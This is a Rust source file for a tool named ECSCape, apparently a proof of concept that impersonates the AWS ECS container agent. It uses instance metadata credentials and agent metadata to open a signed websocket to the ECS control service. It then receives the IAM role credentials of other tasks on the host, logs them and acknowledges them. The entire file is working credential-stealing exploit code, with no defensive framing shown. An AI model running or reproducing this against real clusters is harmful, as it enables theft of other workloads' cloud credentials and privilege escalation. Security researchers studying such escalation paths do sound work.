use anyhow::{Result, anyhow};
use aws_sdk_ecs::Client as ECSClient;
use aws_sdk_ecs::config::{Credentials, SharedCredentialsProvider};
use aws_types::SdkConfig;
use aws_types::region::Region;
use futures_util::{SinkExt, StreamExt};
use tracing::{debug, info};
use url::Url;

use crate::config::{ACS_PROTOCOL_SEC_NUM, ACS_PROTOCOL_SEND_CREDENTIALS, ACS_PROTOCOL_VERSION};
use crate::ecs_agent_metadata::ECSAgentMetadata;
use crate::ecs_protocol_client::ECSProtocolClient;
use crate::imds_metadata::IMDSMetadata;
use crate::structs::{IAMRoleCredentialsAckRequest, ProtocolMessage};
use crate::utils::{build_ws_url, create_sigv4_signed_request};

pub struct ECSCape {
    imds_metadata: IMDSMetadata,
    ecs_agent_metadata: ECSAgentMetadata,
}

impl ECSCape {
    pub async fn try_new() -> Result<Self> {
        let imds_metadata = IMDSMetadata::try_new().await?;
        debug!("imds metadata: {:#?}", imds_metadata);

        let ecs_agent_metadata = ECSAgentMetadata::try_new(&imds_metadata.local_ip).await?;
        debug!("ecs agent metadata: {:#?}", ecs_agent_metadata);

        Ok(Self {
            imds_metadata,
            ecs_agent_metadata,
        })
    }

    pub async fn start(&self) -> Result<()> {
        let acs_url = self.get_acs_url().await?;
        debug!("acs url: {:#?}", acs_url);

        let signed_request = create_sigv4_signed_request(
            acs_url,
            &self.imds_metadata.aws_region,
            self.imds_metadata.aws_access_key_id.clone(),
            self.imds_metadata.aws_access_secret_key.clone(),
            self.imds_metadata.aws_access_token.clone(),
        )?;

        let acs_client = ECSProtocolClient::new(signed_request);
        let (mut recv_stream, send_sink) = acs_client.connect().await?;

        while let Some(msg) = recv_stream.next().await {
            match msg? {
                ProtocolMessage::IAMRoleCredentialsMessage(role_creds) => {
                    info!("received role creds: {:#?}", role_creds);

                    let ack_request = IAMRoleCredentialsAckRequest {
                        message_id: role_creds.message_id.clone(),
                        expiration: role_creds.role_credentials.expiration,
                        credentials_id: role_creds.role_credentials.credentials_id,
                    };

                    send_sink
                        .lock()
                        .await
                        .send(ProtocolMessage::IAMRoleCredentialsAckRequest(ack_request))
                        .await?;
                }
                _ => {}
            }
        }

        Ok(())
    }

    fn build_acs_url(&self, poll_endpoint_url: &str) -> Result<Url> {
        let mut url = build_ws_url(poll_endpoint_url)?;
        url.query_pairs_mut()
            .append_pair("agentHash", &self.ecs_agent_metadata.ecs_agent_hash)
            .append_pair("agentVersion", &self.ecs_agent_metadata.ecs_agent_version)
            .append_pair("clusterArn", &self.ecs_agent_metadata.cluster_arn)
            .append_pair(
                "containerInstanceArn",
                &self.ecs_agent_metadata.container_instance_arn,
            )
            .append_pair("protocolVersion", ACS_PROTOCOL_VERSION)
            .append_pair("seqNum", ACS_PROTOCOL_SEC_NUM)
            .append_pair(
                "sendCredentials",
                &ACS_PROTOCOL_SEND_CREDENTIALS.to_string(),
            );

        Ok(url)
    }

    async fn get_acs_url(&self) -> Result<Url> {
        let ecs_client = ECSClient::new(
            &SdkConfig::builder()
                .credentials_provider(SharedCredentialsProvider::new(Credentials::new(
                    self.imds_metadata.aws_access_key_id.clone(),
                    self.imds_metadata.aws_access_secret_key.clone(),
                    Some(self.imds_metadata.aws_access_token.clone()),
                    None,
                    "IMDS",
                )))
                .region(Region::new(self.imds_metadata.aws_region.clone()))
                .build(),
        );

        let poll_endpoint = ecs_client
            .discover_poll_endpoint()
            .cluster(&self.ecs_agent_metadata.cluster_arn)
            .container_instance(&self.ecs_agent_metadata.container_instance_arn)
            .send()
            .await?;

        let poll_endpoint_url = poll_endpoint
            .endpoint()
            .ok_or(anyhow!("no acs endpoint url"))?;

        let acs_url = self.build_acs_url(poll_endpoint_url)?;

        Ok(acs_url)
    }
}
